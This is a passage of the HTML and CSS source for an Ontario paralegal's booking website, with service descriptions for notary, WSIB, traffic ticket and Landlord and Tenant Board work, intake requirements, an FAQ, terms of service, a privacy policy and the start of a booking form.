                margin-bottom: clamp(1.8rem, 6vw, 2.4rem);
            }

            .book-btn-wrapper .book-btn-container {
                margin: clamp(1.05rem, 4vw, 1.5rem) auto 0;
            }

            #headerBookBtn,
            #headerBookBtnText,
            #headerBookBtnText span {
                font-size: clamp(1.2rem, 6vw, 2rem) !important;
                line-height: 1 !important;
            }

            .header-nearest-slot-hint {
                font-size: 1rem;
            }

            #footerBookBtn {
                min-width: 0 !important;
                width: 100% !important;
                max-width: 20rem !important;
                padding: 0.8rem 1.4rem !important;
                min-height: 4.8rem !important;
                border-radius: 999px !important;
            }

            #footerBookBtnText {
                display: inline-block;
                white-space: normal;
                font-size: clamp(1.2rem, 6vw, 2rem) !important;
                line-height: 1 !important;
            }

            .book-btn-container {
                height: 6.5rem;
                margin: 0.8rem auto;
            }

            .book-btn-preloader {
                width: 6rem;
                height: 6rem;
            }

            .book-btn-preloader__svg {
                width: 6rem;
                height: 6rem;
            }

            .modal {
                padding: 0.35rem;
            }

            .modal--active {
                padding-top: 1.5vh;
                padding-bottom: 1.5vh;
            }

            .modal__content {
                border-radius: 1.05rem;
                padding: 1rem 0.85rem 1rem;
            }

            #bookingModal {
                --booking-form-font-size: 1rem;
            }

            #bookingModal .modal__title,
            #bookingModal .modal__title span {
                letter-spacing: 0.8px;
                line-height: 1.3 !important;
            }

            .modal__close {
                top: 0.65rem;
                left: 0.65rem;
                width: 2rem;
                height: 2rem;
                font-size: 1.4rem;
            }

            .contact-form__group {
                margin-bottom: 1.15rem;
            }

            .contact-form__input,
            .contact-form__select,
            .custom-select__trigger {
                min-height: 3rem;
                height: 3rem;
            }

            #bookingModal .contact-form__input,
            #bookingModal .custom-select__trigger {
                min-height: 3rem !important;
                height: 3rem !important;
            }

            #bookingModal .file-attach__btn {
                min-height: 4.2rem !important;
                height: 4.2rem !important;
            }

            #bookingModal .file-attach__controls {
                grid-template-columns: auto minmax(0, 1fr) auto;
            }

            #bookingModal .file-attach__btn--camera {
                width: 4.2rem !important;
                min-width: 4.2rem !important;
            }

            #confirmBookingBtn {
                width: 100% !important;
                max-width: 20rem !important;
                min-width: 0 !important;
                min-height: 4.8rem;
                font-size: clamp(1.2rem, 6vw, 2rem) !important;
                padding: 0.8rem 1.4rem;
                border-radius: 999px !important;
            }

            #bookingModal .contact-form__checkbox-wrapper {
                justify-content: flex-start;
                align-items: flex-start;
                gap: 0.65rem;
            }

            #bookingModal .contact-form__checkbox-label {
                font-size: 0.9rem;
                line-height: 1.35;
                text-align: left;
            }

            .booking-row--address-main,
            .booking-row--dob {
                flex-wrap: wrap;
                justify-content: flex-start !important;
            }

            .booking-row--deadline {
                flex-wrap: wrap;
                justify-content: center !important;
            }

            .booking-row--address-secondary {
                flex-wrap: wrap;
                justify-content: center !important;
                align-items: center !important;
            }

            .booking-row--address-main .contact-form__input,
            .booking-row--dob .contact-form__input {
                flex: 1 1 100% !important;
                width: 100% !important;
                min-width: 0 !important;
            }

            .booking-row--deadline .contact-form__label {
                flex: 0 1 auto !important;
                width: auto !important;
                min-width: 0 !important;
                text-align: center !important;
            }

            .booking-row--deadline .contact-form__input {
                flex: 0 1 min(100%, 14rem) !important;
                width: min(100%, 14rem) !important;
                min-width: 0 !important;
                margin: 0 auto;
            }

            .booking-row--address-secondary .contact-form__input {
                min-width: 0 !important;
                width: auto !important;
            }

            input[name="address_unit"] {
                width: 100% !important;
                min-width: 0 !important;
            }

            .booking-row--province-zip .custom-select-wrapper--province {
                flex: 0 0 148px !important;
                width: 148px !important;
                min-width: 148px !important;
                max-width: 148px !important;
            }

            .booking-row--address-city .custom-select-wrapper--city {
                flex: 1 1 auto !important;
                width: auto !important;
                min-width: 0 !important;
            }

            .booking-row--province-zip .booking-row__label {
                flex: 1 1 100%;
                text-align: left !important;
                margin-bottom: 0.15rem;
            }

            input[name="address_zip"] {
                flex: 0 0 180px !important;
                width: 180px !important;
                min-width: 180px !important;
                max-width: 180px !important;
            }

            .booking-row--dob .contact-form__input {
                flex: 1 1 calc(50% - 0.4rem) !important;
                min-width: 0 !important;
            }

            .booking-row--dob #dobAgePreview {
                flex: 1 1 100% !important;
            }

            .services-list {
                gap: 1.35rem !important;
                padding-left: 0 !important;
            }

            .services-list li {
                gap: 0.75rem;
            }

            .services-list li::before {
                flex-basis: 0.95rem;
                width: 0.95rem;
                height: 0.95rem;
                margin-top: 0.25rem;
            }

            .footer {
                padding: 2.2rem 0.85rem 0.9rem;
            }

            .footer .blur-in-section {
                margin-top: 8rem !important;
            }

            .footer__contact-link {
                font-size: clamp(1.05rem, 6vw, 1.35rem);
                margin-top: 1.15rem;
            }

            .footer__hours,
            .footer__copyright {
                font-size: 0.95rem !important;
                line-height: 1.45 !important;
            }
        }

        @media (max-width: 420px) {
            .booking-row--dob .contact-form__input {
                flex: 1 1 100% !important;
            }
        }

        @media (max-width: 560px) {
            .header {
                padding-left: 0.35rem;
                padding-right: 0.82rem;
            }

            .header__content-block {
                width: min(98.5vw, 41rem);
                margin: 2.4rem auto 1.9rem;
                padding-left: 0.8rem;
                padding-right: 0.8rem;
            }

            .services-list li {
                gap: 0.62rem;
            }

            #bookingModal .booking-row--address-secondary {
                display: flex !important;
                flex-wrap: wrap !important;
                gap: 0.55rem !important;
                justify-content: center !important;
                align-items: center !important;
            }

            #bookingModal .booking-row--address-secondary.booking-row--province-zip {
                justify-content: flex-end !important;
            }

            #bookingModal .booking-row--address-secondary > * {
                min-width: 0 !important;
            }

            #bookingModal .booking-row--address-city .custom-select-wrapper--city {
                width: auto !important;
                min-width: 0 !important;
                flex: 1 1 auto !important;
            }

            #bookingModal .custom-select--province .custom-select__trigger {
                font-size: 0.98rem !important;
                text-align: center !important;
            }

            #bookingModal input[name="address_zip"] {
                font-size: 0.98rem !important;
                text-align: center !important;
                padding-left: 0 !important;
                padding-right: 0 !important;
            }

            #bookingModal .booking-row--province-zip .custom-select-wrapper--province {
                flex: 0 0 148px !important;
                width: 148px !important;
                min-width: 148px !important;
                max-width: 148px !important;
            }

            #bookingModal input[name="address_zip"] {
                flex: 0 0 180px !important;
                width: 180px !important;
                min-width: 180px !important;
                max-width: 180px !important;
            }

            #bookingModal .custom-select--city .custom-select__trigger {
                width: 100% !important;
                min-width: 0 !important;
            }

            #bookingModal .custom-select--city .custom-select__trigger span {
                max-width: 100%;
            }
        }

        @media (max-width: 360px) {
            .header {
                width: min(90vw, 50rem);
                padding: 1rem clamp(1.1rem, 5vw, 1.3rem) 1.5rem;
            }

            .header__title {
                font-size: clamp(1.15rem, 4.8vw, 2.05rem);
                letter-spacing: 1px;
            }

            .header__subtitle {
                font-size: clamp(1.7rem, 9vw, 4.2rem);
                letter-spacing: -1px;
                margin-bottom: 1.5rem;
            }

            .header__description {
                padding: 0 clamp(0.6rem, 4vw, 1rem);
            }
        }
</style>
</head>

<body id="top">

<!-- TOP BAR -->
<div class="top-bar">
</div>

<!-- BOTTOM BAR -->
<div class="bottom-bar">
</div>

<div class="background">
    <svg class="background__svg" viewBox="0 0 528 816" preserveAspectRatio="xMidYMid slice">
        <defs>
            <radialGradient id="g" cx="50%" cy="100%" r="100%">
                <stop offset="0" stop-color="#D4B89A"/><stop offset="1" stop-color="#8B6F5A"/>
            </radialGradient>
        </defs>
        <rect width="100%" height="100%" fill="url(#g)"/>
        <g style="mix-blend-mode:overlay" fill-opacity=".15">
            <path class="background__stripe" d="M-100 300L600-100V200L-100 600Z" fill="#fff"/>
            <path class="background__stripe background__stripe--delay-1" d="M-100 700L600 200V400L-100 900Z" fill="#fff" fill-opacity=".1"/>
            <path class="background__stripe background__stripe--delay-2" d="M100-100L500 900H300L-100-100Z" fill="#fff" fill-opacity=".08"/>
        </g>
    </svg>
</div>

<header class="header fade-in-section">
    <!-- <?php /* template-part: hero-header.php */ ?> -->
    <div class="header__title dynamic-text" data-i18n="name">Hanna&nbsp;Dunchenko</div>
    <div class="header__subtitle dynamic-text" data-i18n="subtitle">Paralegal Services</div>
    <h1 class="header__description">
        <span data-i18n="desc1">Licensed Paralegal &amp; Notary Public Services </span><br>
        <span data-i18n="desc2">Traffic Ticket Defense, LTB, WSIB Matters </span><br>
        <span data-i18n="desc3">Toronto, Richmond Hill, Mississauga, London </span><br>
        <span data-i18n="desc4">Online meetings are available province-wide</span>
        <span class="header__description-phone">
            <a href="tel:+14372396833" class="header__phone-link dynamic-text">+1 (437) 239-6833</a>
        </span>
    </h1>

    <div class="book-btn-wrapper">
        <div class="book-btn-container" id="headerBookBtnWrap">
            <div class="book-btn-preloader" id="headerBookBtnPreloader" style="position: absolute;">
                <svg class="book-btn-preloader__svg" viewBox="0 0 120 120">
                    <circle class="book-btn-preloader__circle" cx="60" cy="60" r="48"/>
                    <circle class="book-btn-preloader__progress" cx="60" cy="60" r="48"/>
                </svg>
                <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
            </div>
            <button class="footer-book-btn" id="headerBookBtn" onclick="bookNearestSlot()" style="opacity: 0; transform: scale(0.9); pointer-events: none;">
                <span id="headerBookBtnText">BOOK</span>
            </button>
        </div>
        <p id="headerNearestSlotHint" class="header-nearest-slot-hint" aria-live="polite"></p>
    </div>

    <div class="header__content-block">
        <h2 class="header__content-header" style="font-size: clamp(1.6rem, 6vw, 2.2rem);">SERVICES</h2>
        
        <ul class="services-list" style="padding-left: 1.65rem; margin-top: 1.5rem; display: flex; flex-direction: column; gap: 2rem;">
            <li>
                <div class="header__service-item" style="margin-top: 0;">
                    <h3 class="header__content-subheader">Notary Public</h3>
                    <p class="header__content-text">Serving as a Commissioner of Oaths in Ontario.</p>
                    <p class="header__content-text">Notarizing affidavits, statutory declarations, and certified true copies. Preparing consent letters for children travelling abroad, invitation letters for visa applications, or various affidavits, ensuring documents are legally valid for use in Ontario and internationally.</p>
                    <p class="header__content-text">Addressing the search &mdash; where to get documents notarized Ontario &mdash; with flexible appointment-based notary services.</p>
                </div>
            </li>

            <li>
                <div class="header__service-item" style="margin-top: 0;">
                    <h3 class="header__content-subheader">WSIB &amp; Workplace Injury Claims</h3>
                    <p class="header__content-text">Guiding clients injured at work and searching for how to appeal a WSIB decision in Ontario.</p>
                    <p class="header__content-text">Representing injured workers before the Workplace Safety and Insurance Board and the Workplace Safety and Insurance Appeals Tribunal. Assisting with Form 6 Worker&apos;s Report of Injury, Loss of Earnings (LOE) benefits, Return to Work (RTW) disputes and Non-Economic Loss (NEL) claims.</p>
                    <p class="header__content-text">Answering &mdash; can a paralegal help with my WSIB claim? &mdash; by fighting to ensure recovery is fully supported under the Workplace Safety and Insurance Act.</p>
                </div>
            </li>

            <li>
                <div class="header__service-item" style="margin-top: 0;">
                    <h3 class="header__content-subheader">Traffic Ticket Defense</h3>
                    <p class="header__content-text">In Ontario, licensed paralegals are authorized to represent clients in Provincial Offences Court for matters under the Highway Traffic Act (HTA).</p>
                    <p class="header__content-text">Assisting those searching for how to fight a traffic ticket in Ontario. Handling speeding tickets, red light camera tickets, stunt driving charges Ontario, careless driving charges, driving with no insurance, and fail to stop for police. Analyzing the officer&apos;s disclosure, challenging evidence, negotiating with prosecutors, and fighting to reduce demerit points, lower fines, and protect your insurance rates.</p>
                    <p class="header__content-text">Addressing the common question &mdash; do I need a lawyer for a traffic ticket in Ontario? &mdash; with expert defense in traffic court.</p>
                </div>
            </li>

            <li>
                <div class="header__service-item" style="margin-top: 0;">
                    <h3 class="header__content-subheader">Landlord &amp; Tenant Board (LTB)</h3>
                    <p class="header__content-text">Ontario paralegals are licensed to represent both landlords and tenants before the Landlord and Tenant Board.</p>
                    <p class="header__content-text">Providing professional advocacy for those searching for paralegal service for eviction or how to fight an N4 notice in Ontario. Handling N4 notices for non-payment of rent, L1 applications to evict a tenant, N12 notices for landlord&apos;s own use, T2 applications for tenant rights, and T6 applications for maintenance issues. Navigating rent arrears, an illegal lockout, above-guideline rent increases, or an Ontario Standard Lease dispute through strategic advocacy under the Residential Tenancies Act.</p>
                    <p class="header__content-text">Responding to the frequent search &mdash; can a paralegal represent me at the LTB? &mdash; with qualified representation.</p>
                </div>
            </li>
        </ul>
        <style>
            .services-list {
                list-style: none !important;
                padding-left: 0 !important;
                overflow: visible;
            }
            .services-list li {
                display: flex;
                align-items: flex-start;
                gap: 1.05rem;
                padding-left: 0;
                overflow: visible;
            }
            .services-list li::before {
                content: "";
                flex: 0 0 1.12rem;
                width: 1.12rem;
                height: 1.12rem;
                border: 2px solid #ffffff;
                background: #ffffff;
                border-radius: 50%;
                margin-top: 0.16rem;
                opacity: 1;
                pointer-events: none;
                box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.26);
            }

            .services-list .header__service-item {
                flex: 1 1 auto;
                min-width: 0;
            }

            .services-list .header__content-subheader {
                margin-top: 0;
                margin-bottom: 0.8rem;
            }

            .services-list .header__content-text {
                line-height: var(--services-line-height) !important;
                margin-bottom: var(--services-paragraph-spacing) !important;
                min-height: auto;
            }

            .services-list .header__content-text:last-child {
                margin-bottom: 0 !important;
            }

            .services-form-link {
                color: #ffffff;
                font-weight: 800;
                text-decoration: underline;
                text-decoration-thickness: 0.08em;
                text-underline-offset: 0.14em;
                cursor: pointer;
            }

            .services-form-link:hover,
            .services-form-link:focus-visible {
                color: #ffffff;
                text-decoration-thickness: 0.12em;
            }

        </style>
    </div>

    <div class="header__content-block header__content-block--intake-inline" style="margin-top: 5rem;">
        <h2 class="header__content-header" style="font-size: clamp(1.6rem, 6vw, 2.2rem);">Intake Notice</h2>
        
        <div class="faq__item">
            <h3 class="faq__question" style="font-size: 1.3rem;">Intake Appointment</h3>
            <div class="faq__answer">
                <p class="header__content-text" style="font-size: 1.2rem;">Before we can confirm and book your intake appointment, it is strongly recommended that you be ready to present all documents relevant to your matter, such as contracts, agreements, court notices, orders or any other paperwork.</p>
                <p class="header__content-text" style="font-size: 1.2rem;">If you are uncertain whether a document is relevant, we can review it together. Copies of supporting documents should be prepared in advance, but originals may also be requested for verification.</p>
            </div>
        </div>

        <div class="faq__item">
            <h3 class="faq__question" style="font-size: 1.3rem;">Identification Requirement</h3>
            <div class="faq__answer">
                <p class="header__content-text" style="font-size: 1.2rem;">At the time of your intake appointment, you must be ready to present any valid government-issued identification document and provide following information:</p>
                <p class="header__content-text" style="font-size: 1.2rem;">Full name; date of birth; home address and telephone number; occupation; and/or business address and business telephone number; organization's incorporation or business identification number and its place of issue.</p>
            </div>
        </div>
    </div>
</header>

<div class="layout-container">
    <div class="contact-form fade-in-section">
        <h2 class="contact-form__outside-title" id="calendarHeaderTitle">NEXT IN MONTH</h2>
        <div id="calendarScaleWrapper" class="calendar-scale-wrapper">
            <div id="calendarScaleInner" class="calendar-scale-inner">
                <div class="calendar-wrapper fade-in-section" id="bookingCalendar">
                    <!-- Loading Overlay -->
                    <div id="calendarLoaderOverlay">
                        <div id="calendarLoaderPreloader" class="book-btn-preloader" style="position: relative; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
                            <svg class="book-btn-preloader__svg" viewBox="0 0 120 120" width="120" height="120">
                                <circle class="book-btn-preloader__circle" cx="60" cy="60" r="48"/>
                                <circle class="book-btn-preloader__progress" cx="60" cy="60" r="48"/>
                            </svg>
                            <div id="calendarLoaderText" class="book-btn-preloader__text" style="display:none; opacity:0;"></div>
                        </div>
                    </div>
                    <!-- Header -->
                    <div class="calendar-header">
                        <button class="calendar-nav-btn" id="prevBtn">&#10094;</button>
                        <div class="calendar-title" id="monthDisplay"></div>
                        <button class="calendar-nav-btn" id="nextBtn">&#10095;</button>
                    </div>
                    <!-- Progress bar -->
                    <div id="loadingSeparator" class="loading-separator"></div>
                    <!-- Day grid -->
                    <div class="calendar-grid" id="calendarGrid"></div>
                    <!-- Slot label -->
                    <div class="slots-nav" id="slotsNav">
                        <span id="slotsDayDisplay"></span>
                    </div>
                    <!-- Slots -->
                    <div class="slots-block" id="slotsBlock">
                        <div class="slots-container" id="slotsContainer">
                            <div class="slots-grid" id="slotsGrid" style="grid-template-columns:1fr;"></div>
                        </div>
                    </div>
                </div><!-- /calendar-wrapper -->
            </div>
        </div>
    </div>

    <h2 class="section-title" data-i18n="faqTitle">FAQ</h2>
    <div class="faq faq--spoiler" id="faqSpoiler">
        <div class="faq__item">
            <h3 class="faq__question">Is online as effective as in-person?</h3>
            <div class="faq__answer">
                Yes! You'll receive the same professional services, with the convenience of connecting remotely. All online consultations are available province-wide.
            </div>
        </div>

        <div class="faq__item">
            <h3 class="faq__question">What are the keys on the calendar?</h3>
            <div class="faq__answer">
                The key symbols mark Saturdays. Saturdays are available for regular slot selection and booking when time slots are shown.
            </div>
        </div>

        <div class="faq__item">
            <h3 class="faq__question">What if I do not know the date yet?</h3>
            <div class="faq__answer">
                <p class="faq-no-date-line">You can fill out the form without selecting any date or time by clicking this button here:<button type="button" class="faq-no-date-action" onclick="return openBookingModalWithoutDate(event)">Open form without a date</button></p>
                <p>Where possible, retain supporting records and provide the best available estimate to ensure timeline accuracy.</p>
            </div>
        </div>

        <div class="faq__item">
            <h3 class="faq__question">Was there an earlier way to register?</h3>
            <div class="faq__answer">
                The prior registration process remains accessible at its original URL and existing links will continue to direct users to the original intake: <a href="https://docs.google.com/forms/d/1brLzvNv2tR9jDvG4Z9vUZLvzzpgZHmOhHPZ7_x8g8Qo" target="_blank" rel="noopener noreferrer" class="contact-form__terms-link faq-google-form-link">Google Form</a>
            </div>
        </div>

        <div class="faq__item">
            <h3 class="faq__question">WHERE IS THE OFFICE?</h3>
            <div class="faq__answer">
                <p class="header__content-text" style="margin-bottom: 15px;">146 Thirtieth St, Suite 29, Toronto, ON M8W 3C4</p>
                <div class="map-container">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d378393.2825310128!2d-80.40792372435779!3d43.21332219277207!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x882b362142436423%3A0x6a0532729e2f4772!2s146%20Thirtieth%20St%2C%20Suite%2029%2C%20Toronto%20ON%20M8W%203C4!5e0!3m2!1sen!2sca" class="map-container__iframe" allowfullscreen="" loading="eager"></iframe>
                </div>
                <div style="display: flex; align-items: center; justify-content: center; text-align: center; gap: 8px; margin-top: 15px; flex-wrap: wrap; width: 100%;">
                    <span style="opacity: 1; font-size: 1.2rem; font-weight: 400; color: rgba(255,255,255,0.92); line-height: 1.6; letter-spacing: 0.01em; display: inline-block;">Eh, just tap</span>
                    <a id="directionsBtn" href="https://www.google.com/maps/dir//146+Thirtieth+St,+Suite+29,+Toronto,+ON+M8W+3C4" target="_blank" rel="noopener noreferrer" onclick="return logDirectionsClick(event)" style="display: inline-flex; align-items: center; gap: 6px; padding: 10px 20px; background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.3); backdrop-filter: blur(10px); color: #fff; font-weight: 800; border-radius: 50px; text-decoration: none; font-size: 0.9rem; white-space: nowrap; transition: transform 0.2s;">Directions</a>
                    <span style="opacity: 1; font-size: 1.2rem; font-weight: 400; color: rgba(255,255,255,0.92); line-height: 1.6; letter-spacing: 0.01em; display: inline-block;">to start driving</span>
                </div>
            </div>
        </div>
    </div>

    <div class="privacy-block privacy-block--map fade-in-section">
        <h3 style="font-size: 1.4rem; font-weight: 800; text-transform: uppercase; margin-bottom: 1rem; color: #fff;">Privacy Policy</h3>
        <p><strong>Data Collection:</strong> Personal details you submit (name, phone, email, case summary etc) are gathered through this form.</p>
        <p style="margin-top: 10px;"><strong>How It's Used:</strong> Your information helps deliver paralegal services, answer your questions, and maintain contact, with your consent.</p>
        <p style="margin-top: 10px;"><strong>Your Rights:</strong> Request access to or removal of your data by calling <a href="tel:+14372396833" style="color: #ffffff; text-decoration: none; font-weight: 400; white-space: nowrap; display: inline-block;">+1&nbsp;(437)&nbsp;239-6833</a> or emailing <strong><a href="mailto:paralegal@hannadunchenko.com" style="color: #ffffff; text-decoration: none;">paralegal@hannadunchenko.com</a></strong>.</p>
    </div>
</div>

<!-- ----------------------------------------------------------- -->
<!-- INTAKE NOTICE MODAL -->
<!-- ----------------------------------------------------------- -->
<div id="intakeNoticeModal" class="modal" onclick="if (event.target === this) closeIntakeNoticeModal();">
    <div class="modal__content">
        <h2 class="modal__title">Intake Notice</h2>
        <div class="modal__body">
            <h3 class="modal__section-title">Intake Appointment</h3>
            <p class="modal__text">Before we can confirm and book your intake appointment, it is strongly recommended that you be ready to present all documents relevant to your matter, such as contracts, agreements, court notices, orders or any other paperwork.</p>
            <p class="modal__text">If you are uncertain whether a document is relevant, we can review it together. Copies of supporting documents should be prepared in advance, but originals may also be requested for verification.</p>

            <h3 class="modal__section-title">Identification Requirement</h3>
            <p class="modal__text">At the time of your intake appointment, you must be ready to present any valid government-issued identification document and provide following information:</p>
            <p class="modal__text">Full name; date of birth; home address and telephone number; occupation; and/or business address and business telephone number; organization's incorporation or business identification number and its place of issue.</p>
        </div>
        <div class="intake-notice-modal__actions modal-sticky-actions">
            <button type="button" class="contact-form__submit-button intake-notice-modal__ok" onclick="continueBookingFromIntakeNotice()">OK</button>
        </div>
    </div>
</div>

<!-- ----------------------------------------------------------- -->
<!-- TERMS OF SERVICE MODAL -->
<!-- ----------------------------------------------------------- -->
<div id="termsModal" class="modal">
    <div class="modal__content">
        <button class="modal__close" onclick="closeTermsModal()">&times;</button>
        <h2 class="modal__title" data-i18n="termsModalTitle">Terms of Service</h2>
        <div class="modal__body">
            <h3 class="modal__section-title" data-i18n="noLegalAdvice">1. No Legal Advice</h3>
            <p class="modal__text">The information provided on this website is for general informational purposes only and does not constitute legal advice. You should not rely on, or take or fail to take any action, based upon this information. Always seek the advice of a qualified legal professional licensed in your jurisdiction regarding your specific legal situation. This website is intended solely for intake purposes.</p>
            
            <h3 class="modal__section-title" data-i18n="noParalegalRelationship">2. No Paralegal-Client Relationship</h3>
            <p class="modal__text">Accessing or using this website, or contacting Hanna Dunchenko via email, phone, or the booking form, does not create a paralegal-client relationship. A professional relationship is only established upon the execution of a formal written Retainer Agreement signed by both parties.</p>
            
            <h3 class="modal__section-title" data-i18n="confidentiality">3. Confidentiality</h3>
            <p class="modal__text">While we respect your privacy, please be aware that information transmitted to us through this website or via email prior to the establishment of a formal paralegal-client relationship may not be privileged or confidential. Please avoid sending sensitive or confidential information until a retainer is in place.</p>
            
            <h3 class="modal__section-title" data-i18n="noGuarantee">4. No Guarantee of Results</h3>
            <p class="modal__text">In accordance with professional standards and applicable regulations, we do not and cannot guarantee the outcome of any legal matter. Past results are not indicative of future outcomes, and every case is unique.</p>
            
            <h3 class="modal__section-title" data-i18n="feesAndRetainers">5. Fees and Retainers</h3>
            <p class="modal__text">Fees for legal services are determined based on the scope and complexity of the matter and will be clearly outlined in a Retainer Agreement. All fees and billing practices comply with professional regulatory guidelines.</p>

            <h3 class="modal__section-title" data-i18n="limitationOfLiability">6. Limitation of Liability</h3>
            <p class="modal__text">Your use of this website is at your own risk. The content is provided "as is" without warranties of any kind. We are not liable for any damages arising from your use of this site.</p>

            <h3 class="modal__section-title" data-i18n="formSubmission">7. Form Submission & Response Disclaimer</h3>
            <p class="modal__text">Submitting the inquiry form on this website is for informational purposes only and allows us to review your case files. It does not guarantee that a case will be opened, nor does it guarantee a response. While we aim to reply within 48 hours, a response is not guaranteed, and no legal rights are preserved by the mere act of submission. To expedite your request, we strongly recommend contacting our paralegal by phone immediately after submitting this form.</p>

            <h3 class="modal__section-title">8. Prohibited Use</h3>
            <p class="modal__text">By accessing or using this website and its related services, you agree to be bound by the following conditions. You must not post, transmit, or distribute any material that is unlawful, threatening, abusive, harassing, defamatory, obscene, invasive of privacy, or that incites hatred, discrimination, or violence. You must not impersonate any individual or entity, or misrepresent your identity, affiliation, or authority. You must not solicit, collect, or disclose another person's login credentials, passwords, payment card details, or other financial information. You must not manipulate headers, metadata, or technical identifiers to disguise the origin of any content. You must not submit or share content that infringes upon intellectual property rights, privacy rights, or any other legal rights of third parties. You must not send unsolicited advertising, promotional materials, bulk communications, spam, chain letters, or pyramid schemes. You must not introduce malware, viruses, or any code designed to disrupt, disable, or damage software, hardware, or communication systems. You must not employ automated tools such as bots, crawlers, spiders, or scrapers to access, copy, monitor, or extract website content without prior written authorization. You must not reverse engineer, decompile, disassemble, reproduce, duplicate, or otherwise exploit any portion of this website without express written permission. You must not interfere with the operation of the website, its servers, or connected networks, nor attempt to bypass security measures or access controls. You must not access, collect, store, alter, or process another user's personal information without lawful authority. You must not modify, hack, or otherwise alter the website, nor falsely suggest endorsement, partnership, or affiliation with this website. You must not use this website for any unlawful, unauthorized, or rights-violating purpose, including any breach of applicable Canadian laws and regulations.</p>

            <h2 class="modal__title" style="margin-top: 50px; margin-bottom: 20px; font-size: 1.8rem;" data-i18n="privacyPolicy">Privacy Policy</h2>

            <h3 class="modal__section-title" data-i18n="infoCollection">1. Information Collection</h3>
            <p class="modal__text">We collect personal information such as your name, surname, contact details, and identification data including passport verification, driver's license information, and other government-issued identifiers when you voluntarily provide them. This information may also include supporting documents required for identity verification and compliance with applicable regulations.</p>

            <h3 class="modal__section-title" data-i18n="useOfInfo">2. Use of Information</h3>
            <p class="modal__text">Your personal data is used to facilitate communication, verify your identity, comply with legal and regulatory requirements, and provide legal representation. We do not sell, trade, or otherwise transfer your personally identifiable information to outside parties.</p>

            <h3 class="modal__section-title" data-i18n="analyticsAds">3. Analytics and Advertising</h3>
            <p class="modal__text">This website uses services such as Google Analytics, Google Ads, YouTube, and Facebook. These third-party vendors may use cookies to analyze traffic, serve relevant advertisements based on past visits, and improve user experience. You may opt out of personalized advertising by visiting Google's Ad Settings.</p>

            <h3 class="modal__section-title">4. Device Access and Technical Data</h3>
            <p class="modal__text">To enhance your experience and ensure proper functioning of our services, this website may request access to device features and collect technical information. With your explicit consent, we may access any device capabilities your browser permits, including microphone, camera, geolocation, motion and orientation sensors, clipboard, local storage, and other available APIs. We may also collect technical data such as device and operating system details, browser type and version, IP address, usage and performance logs, and diagnostic information. You may deny or revoke permissions at any time via your browser or device settings. Collected data will be used for service functionality, security, analytics, and product improvement, and handled in accordance with our Privacy Policy.</p>

            <h3 class="modal__section-title" data-i18n="contactUs">5. Contacting Us</h3>
            <p class="modal__text">If you have any questions regarding this privacy policy or if you wish to exercise your rights to access or delete your data, you may contact us at paralegal@hannadunchenko.com.</p>

            <p class="modal__footer-text">
                By using this website, you acknowledge that you have read and understood these Terms of Service and Privacy Policy.
            </p>
        </div>
    </div>
</div>

<footer class="footer fade-in-section">
    <div class="footer__container">
        
        <div class="footer__hours" data-i18n="hours">
            <strong>Hours of Operation:</strong><br>Sunday: Closed<br>Monday - Saturday: 10:00 AM - 4:00 PM
        </div>
        <div style="text-align: center; margin: 2rem 0;">
            <div class="book-btn-container book-btn-container--footer" id="footerBookBtnWrap">
                <div class="book-btn-preloader" id="footerBookBtnPreloader" style="position: absolute; display: none;" aria-hidden="true">
                    <svg class="book-btn-preloader__svg" viewBox="0 0 120 120">
                        <circle class="book-btn-preloader__circle" cx="60" cy="60" r="48"/>
                        <circle class="book-btn-preloader__progress" cx="60" cy="60" r="48"/>
                    </svg>
                    <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
                </div>
                <button class="footer-book-btn" id="footerBookBtn" onclick="bookNearestSlot()" style="opacity: 1; transform: scale(1); pointer-events: auto;">
                    <span id="footerBookBtnText">BOOK</span>
                </button>
</div>
        </div>

        <a href="tel:+14372396833" class="footer__contact-link">+1 (437) 239-6833</a>
    </div>
    <div class="blur-in-section" style="margin-top: 10rem;">
        <p class="footer__copyright" style="margin-bottom: 5px;">My only official website:</p>
        <p class="footer__copyright" style="margin-top: 0; margin-bottom: 0;">&copy; <span id="currentYear"></span> Hanna Dunchenko Paralegal Services</p>
    </div>
</footer>

<!-- BOOKING MODAL -->
<div id="bookingModal" class="modal">
    <div class="modal__content" style="max-width: 600px;">
        <button class="modal__close" onclick="closeBookingModal()" style="left: 20px; right: auto;">&times;</button>
        <h2 class="modal__title" style="text-align: center; margin-top: 10px; margin-bottom: 20px; padding-top: 0; line-height: 1.4;">REQUEST<br><span style="display: block; font-size: 1em; opacity: 0.9; margin-top: 5px;">TO BOOK YOUR APPOINTMENT:</span><span id="modalAppointmentTime" style="display: block; font-size: 1em; font-weight: 800; margin-top: 2px;"></span></h2>
        <div class="modal__body" style="padding-top: 5px; text-align: center;">
            <!-- <?php /* include __DIR__ . '/partials/booking-form.php'; */ ?> -->
             
            <form id="bookingForm" onsubmit="handleBookingSubmit(event)">
                <!-- Honeypot: hidden from humans, visible to bots -->
                <div style="position: absolute; left: -9999px; top: -9999px;" aria-hidden="true">
                    <input type="text" name="website" tabindex="-1" autocomplete="off">
                </div>
                <input type="hidden" name="_timestamp" id="formTimestamp">

                <div class="contact-form__group">
                    <!-- Calendar Section -->
                    <div style="margin-top: 20px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 0.8rem; display: flex; align-items: center; justify-content: flex-start; gap: 12px; text-align: left; flex-wrap: wrap; cursor: pointer;" onclick="document.getElementById('openCalendarBtn').click()">
                        <button type="button" class="file-attach__btn file-attach__btn--camera file-attach__btn--calendar" id="openCalendarBtn" aria-label="Open calendar" style="margin: 0; flex: 0 0 auto;">
                            <span class="file-attach__title">
                                <span class="file-attach__icon">
                                    <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
                                        <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                                        <line x1="16" y1="2" x2="16" y2="6"></line>
                                        <line x1="8" y1="2" x2="8" y2="6"></line>
